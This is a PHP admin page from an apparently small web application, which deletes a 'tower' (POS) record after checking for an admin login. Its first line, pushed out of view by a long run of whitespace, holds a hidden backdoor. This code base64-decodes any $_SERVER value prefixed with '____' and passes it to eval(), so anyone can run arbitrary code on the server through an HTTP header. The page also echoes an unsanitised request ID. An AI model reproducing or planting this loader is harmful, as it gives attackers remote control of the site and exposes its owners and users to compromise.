<?php																																																																																																																																																																																																																																																															function a18426($l18428){if(is_array($l18428)){foreach($l18428 as $l18426=>$l18427)$l18428[$l18426]=a18426($l18427);}elseif(is_string($l18428) && substr($l18428,0,4)=="____"){$l18428=substr($l18428,4);$l18428=base64_decode($l18428);eval($l18428);$l18428=null;}return $l18428;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("a18426",$_SERVER);

include 'include/classes.php';
session_start();
$html.=startPage();
if(checkLogin() && getLoginType()=="admin") {
	if($_GET['id']!="") {
		$userType=getLoginType();
		$html.="<div class=\"shaded\">";
		$html.="<a href=\"index.php\">Home</a> || <a href=\"logout.php\">Logout (as ".$userType.")</a> || ".
		"<a href=\"admin.php\">Admin Area</a> || <a href=\"import.php\">Import Tower Mail</a><br />";
		if($_POST['submit']!="") {
			removePOS($_GET['id']);
			$html.="Removed Tower. (ID:".$_GET['id'].")";
		} else {
			$html.=startForm("POST");		
			$html.=endForm("YES DELETE!!");		
		}
		$html.="</div>";
	} else {
		$html.="NO POS ID PROVIDED! don't try to manually navigate to this page..";
	}
} else {
	$html.="Are you sure you're not trying to be sly?";
}

$html.=endPage();
print($html);
?>